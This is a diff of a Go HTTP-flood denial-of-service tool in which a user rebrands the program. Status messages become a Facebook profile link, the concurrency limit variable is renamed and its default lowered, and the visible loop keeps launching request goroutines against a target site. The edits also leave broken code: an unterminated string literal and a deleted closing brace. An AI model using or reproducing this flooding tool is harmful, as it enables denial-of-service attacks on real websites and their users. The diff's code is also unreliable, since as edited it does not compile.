@@ -9114,15 +9114,15 @@ func main() {
 	flag.Var(&headers, "header", "Add headers to the request. Could be used multiple times")
 	flag.Parse()
 
-	t := os.Getenv("LMTDDOS")
+	t := os.Getenv("LMT")
 	maxproc, err := strconv.Atoi(t)
 	if err != nil {
-		maxproc = 10000
+		maxproc = 1023
 	}
 
 	u, err := url.Parse(site)
 	if err != nil {
-		fmt.Println("err parsing url parameter\n")
+		fmt.Println("https://www.facebook.com/LeMinhTu.0405")
 		os.Exit(1)
 	}
 
@@ -9147,18 +9147,18 @@ func main() {
 	}
 
 	go func() {
-		fmt.Println("▶ Copyright @HANDOS - Start the attack.... \n\n\n")
+		fmt.Println("Attacking....")
 		ss := make(chan uint8, 8)
 		var (
 			err, sent int32
 		)
-		fmt.Println("\t||\t")
+		fmt.Println("Add FB: https://www.facebook.com/LeMinhTu.0405")
 		for {
 			if atomic.LoadInt32(&cur) < int32(maxproc-1) {
 				go httpcall(site, u.Host, data, headers, ss)
 			}
 			if sent%10 == 0 {
-				fmt.Printf("\r%6d of max %-6d ║\t%7d ║\t%6d", cur, maxproc, sent, err)
+				fmt.Printf("https://www.facebook.com/LeMinhTu.0405", cur, maxproc, sent, err)
 			}
 			switch <-ss {
 			case callExitOnErr:
@@ -9171,8 +9171,8 @@ func main() {
 				sent++
 			case targetComplete:
 				sent++
-				fmt.Printf("\r%-6d of max %-6d ║\t%7d ║\t%6d", cur, maxproc, sent, err)
-				fmt.Println("\r-- LMT Attack Finished --       \n\n\r")
+				fmt.Printf("https://www.facebook.com/LeMinhTu.0405", cur, maxproc, sent, err)
+				fmt.Println("https://www.facebook.com/LeMinhTu.0405")
 				os.Exit(0)
 			}
 		}
@@ -9181,8 +9181,7 @@ func main() {
 	ctlc := make(chan os.Signal)
 	signal.Notify(ctlc, syscall.SIGINT, syscall.SIGKILL, syscall.SIGTERM)
 	<-ctlc
-	fmt.Println("\r\n-- Interrupted by user --        \n")
-}
+	fmt.Println("https://www.facebook.com/LeMinhTu.0405)
 
 func httpcall(url string, host string, data string, headers arrayFlags, s chan uint8) {
 	atomic.AddInt32(&cur, 1)
